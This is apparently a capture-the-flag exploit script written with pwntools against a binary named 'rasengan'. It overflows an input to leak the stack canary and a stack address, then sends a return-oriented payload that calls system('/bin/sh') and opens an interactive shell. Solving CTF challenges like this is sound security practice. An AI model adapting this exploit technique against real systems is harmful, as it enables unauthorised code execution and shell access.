from pwn import *
import os

io = process('./rasengan')
#io = remote('45.119.84.224', 9999)
elf = ELF('./rasengan')
os.system('./hack > gen.txt')

print(io.recvuntil(b'> Hi Ninja. What\'s your name?\n'))
io.send(b'A'*73)

for i in range(8):
    print(io.recvuntil(b'> Value: '))
    io.sendline(str(1337+i).encode('utf-8'))

print(io.recvuntil(b'> Value: '))
io.sendline(str(0xdeadbeef).encode('utf-8'))
print(io.recvuntil(b'> Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'))
canary = u64(io.recv(8)) - 0x41
stack = u64(io.recv(6) + b'\0\0')
print(hex(canary))
print(hex(stack))
print(io.recvuntil(b'Do you want to eat ramen noodles?'))
io.send(b'\0'*73)
f = open('gen.txt', 'r')
ar = f.read().split()
for i in ar:
    print(io.recvuntil(b'> Index: '))
    io.sendline(i.encode('utf-8'))

print(io.recvuntil(b"> Learn how to keep your Chakra stable, do you understand? "))
payload = b'/bin//sh' + b'\0'*0x40 + p64(canary) + p64(stack + 0x8) + p64(elf.sym['stabilize']+1) + p64(elf.sym['stabilize']) 
#+ p64(0x0000000000400ff3) + p64(stack-0x60) + p64(elf.sym['system'])
pause()
io.send(payload)
print(io.recvuntil(b"> Learn how to keep your Chakra stable, do you understand? "))
payload = b'/bin//sh' + b'A' *0x40 + p64(canary) + p64(stack) + p64(0x00000000004007f6) + p64(stack-0x60) + p64(elf.sym['system'])
io.send(payload)
io.interactive()